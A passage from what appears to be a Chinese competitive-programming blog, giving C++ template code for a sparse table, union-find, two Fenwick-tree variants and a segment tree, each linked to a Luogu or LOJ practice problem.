class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> maxn = <span class="hljs-number">1e5</span> + <span class="hljs-number">5</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> maxd = <span class="hljs-number">20</span>;<br><br><span class="hljs-type">int</span> Log[maxn], f[maxn][maxd];<br><br><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span> </span>&#123;<br>    Log[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt; maxn; i++)&#123;<br>        Log[i] = Log[i &gt;&gt; <span class="hljs-number">1</span>] + <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">calc</span><span class="hljs-params">(<span class="hljs-type">int</span> l,<span class="hljs-type">int</span> r)</span></span>&#123;<br>    <span class="hljs-type">int</span> s = Log[r - l + <span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">max</span>(f[l][s], f[r - (<span class="hljs-number">1</span> &lt;&lt; s) + <span class="hljs-number">1</span>][s]);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">int</span> n, m;<br>    cin &gt;&gt; n &gt;&gt; m;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)&#123;<br>        cin &gt;&gt; f[i][<span class="hljs-number">0</span>];<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= maxd; j++)&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)&#123; <br>            <span class="hljs-keyword">if</span>(i + (<span class="hljs-number">1</span> &lt;&lt; (j - <span class="hljs-number">1</span>)) &lt;= n)&#123;<br>                f[i][j] = <span class="hljs-built_in">max</span>(f[i][j - <span class="hljs-number">1</span>], f[i + (<span class="hljs-number">1</span> &lt;&lt; (j - <span class="hljs-number">1</span>))][j - <span class="hljs-number">1</span>]);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> cas = <span class="hljs-number">1</span>; cas &lt;= m; cas++)&#123;<br>        <span class="hljs-type">int</span> l, r;<br>        cin &gt;&gt; l &gt;&gt; r;<br>        cout &lt;&lt; <span class="hljs-built_in">calc</span>(l, r) &lt;&lt; <span class="hljs-string">&#x27;\n&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    ios::<span class="hljs-built_in">sync_with_stdio</span>(<span class="hljs-literal">false</span>);<br>    cin.<span class="hljs-built_in">tie</span>(<span class="hljs-literal">NULL</span>);<br>    cout.<span class="hljs-built_in">tie</span>(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">init</span>();<br>    <span class="hljs-built_in">Main</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="并查集：https-www-luogu-com-cn-problem-P3367"><a href="#并查集：https-www-luogu-com-cn-problem-P3367" class="headerlink" title="并查集：https://www.luogu.com.cn/problem/P3367"></a>并查集：<a href="https://www.luogu.com.cn/problem/P3367">https://www.luogu.com.cn/problem/P3367</a></h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> maxn = <span class="hljs-number">1e4</span> + <span class="hljs-number">5</span>;<br><span class="hljs-type">int</span> fa[maxn];<br><br><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (x == fa[x])<br>    &#123;<br>        <span class="hljs-keyword">return</span> x;<br>    &#125;<br>    <span class="hljs-keyword">return</span> fa[x] = <span class="hljs-built_in">find</span>(fa[x]);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title">merge</span><span class="hljs-params">(<span class="hljs-type">int</span> u, <span class="hljs-type">int</span> v)</span></span><br><span class="hljs-function"></span>&#123;<br>    u = <span class="hljs-built_in">find</span>(u);<br>    v = <span class="hljs-built_in">find</span>(v);<br>    <span class="hljs-keyword">if</span> (u == v)<br>        <span class="hljs-keyword">return</span>;<br>    fa[u] = v;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n, m;<br>    cin &gt;&gt; n &gt;&gt; m;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>        fa[i] = i;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= m; i++)<br>    &#123;<br>        <span class="hljs-type">int</span> op, u, v;<br>        cin &gt;&gt; op &gt;&gt; u &gt;&gt; v;<br>        <span class="hljs-keyword">if</span> (op == <span class="hljs-number">1</span>)<br>        &#123;<br>            <span class="hljs-built_in">merge</span>(u, v);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (op == <span class="hljs-number">2</span>)<br>        &#123;<br>            u = <span class="hljs-built_in">find</span>(u);<br>            v = <span class="hljs-built_in">find</span>(v);<br>            <span class="hljs-keyword">if</span> (u == v)<br>            &#123;<br>                cout &lt;&lt; <span class="hljs-string">&quot;Y\n&quot;</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                cout &lt;&lt; <span class="hljs-string">&quot;N\n&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    ios::<span class="hljs-built_in">sync_with_stdio</span>(<span class="hljs-literal">false</span>);<br>    cin.<span class="hljs-built_in">tie</span>(<span class="hljs-literal">NULL</span>);<br>    cout.<span class="hljs-built_in">tie</span>(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">Main</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="树状数组-单点修改-区间查询：https-loj-ac-p-130"><a href="#树状数组-单点修改-区间查询：https-loj-ac-p-130" class="headerlink" title="树状数组:单点修改_区间查询：https://loj.ac/p/130"></a>树状数组:单点修改_区间查询：<a href="https://loj.ac/p/130">https://loj.ac/p/130</a></h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> maxn = <span class="hljs-number">1e5</span> + <span class="hljs-number">6</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ll long long</span><br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">BIT</span><br>&#123;<br>    ll sum[maxn];<br>    <span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title">lowbit</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> </span>&#123; <span class="hljs-keyword">return</span> x &amp; (-x); &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> val)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">while</span> (x &lt; maxn)<br>        &#123;<br>            sum[x] += val;<br>            x += <span class="hljs-built_in">lowbit</span>(x);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">inline</span> ll <span class="hljs-title">query</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function">    </span>&#123;<br>        ll res = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (x)<br>        &#123;<br>            res += sum[x];<br>            x -= <span class="hljs-built_in">lowbit</span>(x);<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125; T;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n, m;<br>    cin &gt;&gt; n &gt;&gt; m;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) <span class="hljs-comment">//构造树状数组</span><br>    &#123;<br>        <span class="hljs-type">int</span> val;<br>        cin &gt;&gt; val;<br>        T.<span class="hljs-built_in">add</span>(i, val);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= m; i++)<br>    &#123;<br>        <span class="hljs-type">int</span> op, a, b;<br>        cin &gt;&gt; op &gt;&gt; a &gt;&gt; b;<br>        <span class="hljs-keyword">if</span> (op == <span class="hljs-number">1</span>)<br>            T.<span class="hljs-built_in">add</span>(a, b);<br>        <span class="hljs-keyword">if</span> (op == <span class="hljs-number">2</span>)<br>        &#123;<br>            cout &lt;&lt; T.<span class="hljs-built_in">query</span>(b) - T.<span class="hljs-built_in">query</span>(a - <span class="hljs-number">1</span>) &lt;&lt; <span class="hljs-string">&#x27;\n&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    ios::<span class="hljs-built_in">sync_with_stdio</span>(<span class="hljs-literal">false</span>);<br>    cin.<span class="hljs-built_in">tie</span>(<span class="hljs-literal">NULL</span>);<br>    cout.<span class="hljs-built_in">tie</span>(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">Main</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="树状数组-单点查询-区间修改：https-loj-ac-p-131"><a href="#树状数组-单点查询-区间修改：https-loj-ac-p-131" class="headerlink" title="树状数组:单点查询_区间修改：https://loj.ac/p/131"></a>树状数组:单点查询_区间修改：<a href="https://loj.ac/p/131">https://loj.ac/p/131</a></h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> maxn = <span class="hljs-number">1e6</span> + <span class="hljs-number">5</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ll long long</span><br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">BIT</span> &#123;<br>    ll sum[maxn];<br><br>    <span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title">lowbit</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> </span>&#123; <span class="hljs-keyword">return</span> x &amp; (-x); &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-type">int</span> x,<span class="hljs-type">int</span> val)</span> </span>&#123; <br>        <span class="hljs-keyword">while</span>(x &lt; maxn) &#123;<br>            sum[x] += val;<br>            x += <span class="hljs-built_in">lowbit</span>(x);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">inline</span> ll <span class="hljs-title">query</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> </span>&#123;<br>        ll res = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span>(x) &#123;<br>            res += sum[x];<br>            x -= <span class="hljs-built_in">lowbit</span>(x);<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125; T;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> n, m;<br>    cin &gt;&gt; n &gt;&gt; m;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        <span class="hljs-type">int</span> val;<br>        cin &gt;&gt; val;<br>        T.<span class="hljs-built_in">add</span>(i, val);<br>        T.<span class="hljs-built_in">add</span>(i + <span class="hljs-number">1</span>, -val);<span class="hljs-comment">//差分数组</span><br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= m; i++) &#123;<br>        <span class="hljs-type">int</span> op;<br>        cin &gt;&gt; op;<br>        <span class="hljs-keyword">if</span>(op == <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-type">int</span> l, r, val;<br>            cin &gt;&gt; l &gt;&gt; r &gt;&gt; val;<br>            T.<span class="hljs-built_in">add</span>(l, val);<br>            T.<span class="hljs-built_in">add</span>(r + <span class="hljs-number">1</span>, -val);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(op == <span class="hljs-number">2</span>) &#123;<br>            <span class="hljs-type">int</span> x;<br>            cin &gt;&gt; x;<br>            cout &lt;&lt; T.<span class="hljs-built_in">query</span>(x) &lt;&lt; <span class="hljs-string">&#x27;\n&#x27;</span>;<br>        &#125;<br>    &#125;  <br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123; <br>    ios::<span class="hljs-built_in">sync_with_stdio</span>(<span class="hljs-literal">false</span>);<br>    cin.<span class="hljs-built_in">tie</span>(<span class="hljs-literal">NULL</span>);<br>    cout.<span class="hljs-built_in">tie</span>(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">Main</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="线段树：https-loj-ac-p-130"><a href="#线段树：https-loj-ac-p-130" class="headerlink" title="线段树：https://loj.ac/p/130"></a>线段树：<a href="https://loj.ac/p/130">https://loj.ac/p/130</a></h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> maxn = <span class="hljs-number">1e6</span> + <span class="hljs-number">5</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ll long long</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ls rt &lt;&lt; 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> rs rt &lt;&lt; 1 | 1</span><br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Tree</span><br>&#123;<br>    ll sum[maxn &lt;&lt; <span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span> L[maxn &lt;&lt; <span class="hljs-number">2</span>], R[maxn &lt;&lt; <span class="hljs-number">2</span>];<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">pushup</span><span class="hljs-params">(<span class="hljs-type">int</span> rt)</span> </span>&#123; sum[rt] = sum[ls] + sum[rs]; &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">build</span><span class="hljs-params">(<span class="hljs-type">int</span> rt, <span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r)</span> </span>&#123;<br>        L[rt] = l, R[rt] = r;<br>        <span class="hljs-keyword">if</span>(l == r) &#123;<br>            cin &gt;&gt; sum[rt];<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-type">int</span> mid = (l + r) &gt;&gt; <span class="hljs-number">1</span>;<br>        <span class="hljs-built_in">build</span>(ls, l, mid);<br>        <span class="hljs-built_in">build</span>(rs, mid + <span class="hljs-number">1</span>, r);<br>        <span class="hljs-built_in">pushup</span>(rt);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-type">int</span> rt, <span class="hljs-type">int</span> pos, <span class="hljs-type">int</span> val)</span> </span>&#123; <br>        <span class="hljs-keyword">if</span>(L[rt] == R[rt]) &#123;<br>            sum[rt] += val;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-type">int</span> mid = (L[rt] + R[rt]) &gt;&gt; <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span>(pos &lt;= mid)<br>            <span class="hljs-built_in">add</span>(ls, pos, val);<br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-built_in">add</span>(rs, pos, val);<br>        <span class="hljs-built_in">pushup</span>(rt);<br>    &#125;<br><br>    <span class="hljs-function">ll <span class="hljs-title">query</span><span class="hljs-params">(<span class="hljs-type">int</span> rt, <span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r)</span> </span>&#123; <br>        <span class="hljs-keyword">if</span>(L[rt] == l &amp;&amp; R[rt] == r)<br>            <span class="hljs-keyword">return</span> sum[rt];<br>        <span class="hljs-type">int</span> mid = (L[rt] + R[rt]) &gt;&gt; <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span>(r &lt;= mid)<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">query</span>(ls, l, r);<br>        <span class="hljs-keyword">if</span>(l &gt;= mid + <span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">query</span>(rs, l, r);<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">query</span>(ls, l, mid) + <span class="hljs-built_in">query</span>(rs, mid + <span class="hljs-number">1</span>, r);<br>    &#125;<br>&#125; T;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n, m;<br>    cin &gt;&gt; n &gt;&gt; m;<br>    T.<span class="hljs-built_in">build</span>(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, n);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= m; i++) &#123;<br>        <span class="hljs-type">int</span> op, a, b;<br>        cin &gt;&gt; op &gt;&gt; a &gt;&gt; b;<br>        <span class="hljs-keyword">if</span>(op == <span class="hljs-number">1</span>)<br>            T.<span class="hljs-built_in">add</span>(<span class="hljs-number">1</span>, a, b);<br>        <span class="hljs-keyword">if</span>(op == <span class="hljs-number">2</span>)<br>            cout &lt;&lt; T.<span class="hljs-built_in">query</span>(<span class="hljs-number">1</span>, a, b) &lt;&lt; <span class="hljs-string">&#x27;\n&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    ios::<span class="hljs-built_in">sync_with_stdio</span>(<span class="hljs-literal">false</span>);<br>    cin.<span class="hljs-built_in">tie</span>(<span class="hljs-literal">NULL</span>);<br>    cout.<span class="hljs-built_in">tie</span>(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">Main</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="权值线段树：https-www-luogu-com-cn-problem-P1908"><a href="#权值线段树：https-www-luogu-com-cn-problem-P1908" class="headerlink" title="权值线段树：https://www.luogu.com.cn/problem/P1908"></a>权值线段树：<a href="https://www.luogu.com.cn/problem/P1908">https://www.luogu.com.cn/problem/P1908</a></h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> maxn = <span class="hljs-number">5e5</span> + <span class="hljs-number">5</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ll long long</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ls rt &lt;&lt; 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> rs rt &lt;&lt; 1 | 1</span><br><br><span class="hljs-keyword">struct</span> 